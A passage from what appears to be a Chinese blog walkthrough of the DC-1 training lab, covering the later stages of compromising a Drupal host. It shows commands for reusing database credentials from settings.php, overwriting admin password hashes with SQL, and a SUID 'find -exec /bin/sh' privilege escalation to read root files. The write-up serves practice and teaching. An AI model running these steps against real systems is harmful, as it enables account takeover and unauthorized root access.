+<span class="line"><span> * only ways to gain access (and you WILL need access).</span></span>
+<span class="line"><span> * What can you do with these credentials?</span></span>
+<span class="line"><span> *</span></span>
+<span class="line"><span> */</span></span></code></pre>
+<p>flag2提示我们不要去盲目地爆破SSH密码或Drupal后台登录密码，利用凭据</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>$databases = array (</span></span>
+<span class="line"><span>  'default' => </span></span>
+<span class="line"><span>  array (</span></span>
+<span class="line"><span>    'default' => </span></span>
+<span class="line"><span>    array (</span></span>
+<span class="line"><span>      'database' => 'drupaldb',</span></span>
+<span class="line"><span>      'username' => 'dbuser',</span></span>
+<span class="line"><span>      'password' => 'R0ck3t',</span></span>
+<span class="line"><span>      'host' => 'localhost',</span></span>
+<span class="line"><span>      'port' => '',</span></span>
+<span class="line"><span>      'driver' => 'mysql',</span></span>
+<span class="line"><span>      'prefix' => '',</span></span>
+<span class="line"><span>    ),</span></span>
+<span class="line"><span>  ),</span></span>
+<span class="line"><span>);</span></span></code></pre>
+<p><code>settings.php</code>的这一个部分我们可以知道数据库名和数据库的账号密码</p>
+<h1 id="数据库渗透"><a class="anchor" href="#数据库渗透">#</a> 数据库渗透</h1>
+<p>接下来我们可以尝试登录：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>mysql -udbuser -pR0ck3t</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/23.png" class=""></p>
+<p>在数据库里面我们可以利用</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 使用drupal数据库</span></span>
+<span class="line"><span>use drupaldb</span></span>
+<span class="line"><span># 查看所有表</span></span>
+<span class="line"><span>show tables;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/24.png" class=""></p>
+<p>找到有一个users表</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>select * from users</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/26.png" class=""></p>
+<p>可以看到对密码进行了加密，得到了两个用户和两组密码，我们需要通过修改用户密码来进行登录，修改密码的话首先需要找到加密文件</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://drupalchina.cn/node/2128">分享：忘记Drupal的管理员密码的解决办法 | Drupal中国</a></p>
+<p>通过drupal加密密码的脚本加密一个知道的密码，把加密得到的字符串和admin的pass进行替换，加密文件脚本路径在<code>/var/www/scripts/password-hash.sh</code></p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/27.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">/**</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> * Drupal hash script - to generate a hash from a plaintext password</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> *</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> * Check for your PHP interpreter - on Windows you'll probably have to</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> * replace line 1 with</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> *   #!c:/program files/php/php.exe</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> *</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> * </span><span style="color:#1E754F;--shiki-dark:#4D9375">@param</span><span style="color:#998418;--shiki-dark:#B8A965"> password1</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> [password2 [password3 ...]]</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> *  Plain-text passwords in quotes (or with spaces backslash escaped).</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"> */</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#998418;--shiki-dark:#B8A965">version_compare</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">PHP_VERSION</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">5.2.0</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">&#x3C;</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">  $</span><span style="color:#B07D48;--shiki-dark:#BD976A">version</span><span style="color:#999999;--shiki-dark:#666666">  =</span><span style="color:#A65E2B;--shiki-dark:#C99076"> PHP_VERSION</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">  echo</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> &#x3C;&#x3C;&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">EOF</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">ERROR: This script requires at least PHP version 5.2.0. You invoked it with</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">       PHP version </span><span style="color:#999999;--shiki-dark:#666666">&#123;$</span><span style="color:#B56959;--shiki-dark:#C98A7D">version</span><span style="color:#999999;--shiki-dark:#666666">&#125;</span><span style="color:#B56959;--shiki-dark:#C98A7D">.</span></span>
+<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">\n</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">EOF</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">  exit</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">script</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> basename</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#998418;--shiki-dark:#B8A965">array_shift</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">argv</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#998418;--shiki-dark:#B8A965">in_array</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">--help</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">argv</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> ||</span><span style="color:#998418;--shiki-dark:#B8A965"> empty</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">argv</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">  echo</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> &#x3C;&#x3C;&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">EOF</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">Generate Drupal password hashes from the shell.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">Usage:        </span><span style="color:#999999;--shiki-dark:#666666">&#123;$</span><span style="color:#B56959;--shiki-dark:#C98A7D">script</span><span style="color:#999999;--shiki-dark:#666666">&#125;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> [OPTIONS] "&#x3C;plan-text password>"</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">Example:      </span><span style="color:#999999;--shiki-dark:#666666">&#123;$</span><span style="color:#B56959;--shiki-dark:#C98A7D">script</span><span style="color:#999999;--shiki-dark:#666666">&#125;</span><span style="color:#B56959;--shiki-dark:#C98A7D"> "mynewpassword"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">All arguments are long options.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">  --help      Print this page.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">  --root &#x3C;path></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              Set the working directory for the script to the specified path.</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              To execute this script this has to be the root directory of your</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              running on Unix). Use surrounding quotation marks on Windows.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">  "&#x3C;password1>" ["&#x3C;password2>" ["&#x3C;password3>" ...]]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              One or more plan-text passwords enclosed by double quotes. The</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              output hash may be manually entered into the &#123;users&#125;.pass field to</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">              change a password via SQL to a known value.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">To run this script without the --root argument invoke it from the root directory</span></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">of your Drupal installation as</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B56959;--shiki-dark:#C98A7D">  ./scripts/</span><span style="color:#999999;--shiki-dark:#666666">&#123;$</span><span style="color:#B56959;--shiki-dark:#C98A7D">script</span><span style="color:#999999;--shiki-dark:#666666">&#125;</span></span>
+<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">\n</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">EOF</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">  exit</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">passwords</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> array</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">// Parse invocation arguments.</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">while</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">param</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> array_shift</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">argv</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">  switch</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">param</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">&#123;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    case</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> '</span><span style="color:#B56959;--shiki-dark:#C98A7D">--root</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">:</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">      // Change the working directory.</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">      $</span><span style="color:#B07D48;--shiki-dark:#BD976A">path</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> array_shift</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#a13865;--shiki-dark:#d9739f">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">argv</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a13865;--shiki-dark:#d9739f">]</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">      if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#998418;--shiki-dark:#B8A965">is_dir</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">path</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">&#123;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">        chdir</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">path</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">      </span><span style="color:#a65e2b;--shiki-dark:#d4976c">&#125;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">      break</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    default</span><span style="color:#999999;--shiki-dark:#666666">:</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">      // Add a password to the list to be processed.</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">      $</span><span style="color:#B07D48;--shiki-dark:#BD976A">passwords</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">param</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">      break</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">  </span><span style="color:#1e754f;--shiki-dark:#4d9375">&#125;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">define</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">DRUPAL_ROOT</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#998418;--shiki-dark:#B8A965"> getcwd</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">include_once</span><span style="color:#A65E2B;--shiki-dark:#C99076"> DRUPAL_ROOT</span><span style="color:#AB5959;--shiki-dark:#CB7676"> .</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> '</span><span style="color:#B56959;--shiki-dark:#C98A7D">/includes/password.inc</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">include_once</span><span style="color:#A65E2B;--shiki-dark:#C99076"> DRUPAL_ROOT</span><span style="color:#AB5959;--shiki-dark:#CB7676"> .</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> '</span><span style="color:#B56959;--shiki-dark:#C98A7D">/includes/bootstrap.inc</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">foreach</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">passwords</span><span style="color:#AB5959;--shiki-dark:#CB7676"> as</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">password</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">  print</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#A65E2B;--shiki-dark:#C99076">\n</span><span style="color:#B56959;--shiki-dark:#C98A7D">password: </span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B56959;--shiki-dark:#C98A7D">password </span><span style="color:#A65E2B;--shiki-dark:#C99076">\t\t</span><span style="color:#B56959;--shiki-dark:#C98A7D">hash: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676">.</span><span style="color:#59873A;--shiki-dark:#80A665"> user_hash_password</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">password</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> .</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#A65E2B;--shiki-dark:#C99076">\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">print</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#A65E2B;--shiki-dark:#C99076">\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span></code></pre>
+<p>这个脚本用php写的，还能用php加参数运行，直接得到加密后的密码</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>php /var/www/scripts/password-hash.sh 123456</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/28.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>password: 123456                hash: $S$DZ2zFTmLqUjiqAHV4tC./mSLaDrIV3vGS//oJrwN/iqRx.vDhZEM</span></span></code></pre>
+<p>接下来我们试着把admin和Fred用户的密码更换为这个hash值</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>UPDATE users SET pass = "$S$DZ2zFTmLqUjiqAHV4tC./mSLaDrIV3vGS//oJrwN/iqRx.vDhZEM" where name = 'admin' or name = 'Fred';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/29.png" class=""></p>
+<p>接下来我们可以尝试直接在网站里面用账户密码登录：</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/30.png" class=""></p>
+<p>登录进去在File Content栏就能看到flag3了，提示了passwd和shadow，为Linux文件</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</span></span>
+<span class="line"><span>特殊的权限设置有助于找到密码--但您需要执行该命令来弄清楚如何获取所需的内容</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/etc/passwd：该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</span></span>
+<span class="line"><span>/etc/shadow：该文件存储了系统用户的密码等信息，只有root权限用户才能读取</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/31.png" class=""></p>
+<p>在<code>/etc/passwd</code>的最末尾我们看到了flag4这个用户，由于shadow文件需要root权限，所以我们需要用到提权，这里用常见的SUID提权：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查找SUID权限的文件</span></span>
+<span class="line"><span>find / -perm -u=s -type f 2>/dev/null</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/33.png" class=""></p>
+<p>我们可以用比较常用的find命令进行提权：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>find / -name index.php -exec "/bin/sh" \;</span></span></code></pre>
+<p>查找什么文件并不重要，重要的是这个文件得存在</p>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/32.png" class=""></p>
+<p>接下来就是找最后的flag了：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>cd /root</span></span>
+<span class="line"><span>ls</span></span>
+<span class="line"><span>cat thefinalflag.txt</span></span></code></pre>
+<p><img loading="lazy" src="/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/34.png" class=""></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-10-13 18:29:14" itemprop="dateModified" datetime="2026-10-13T18:29:14+08:00">2026-10-13</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>梧桐虽立，其心以空，待发于春，实葬于冬</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="">https://zlaryy.top/2026/10/13/DC-1靶场日记/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/09/27/PKWCTF%20AI%E6%96%B9%E5%90%91WP/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture3.webp" title="PKWCTF AI方向WP"><span class="type">上一篇</span><h3>PKWCTF AI方向WP</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dc-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text"> DC-1靶场日记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 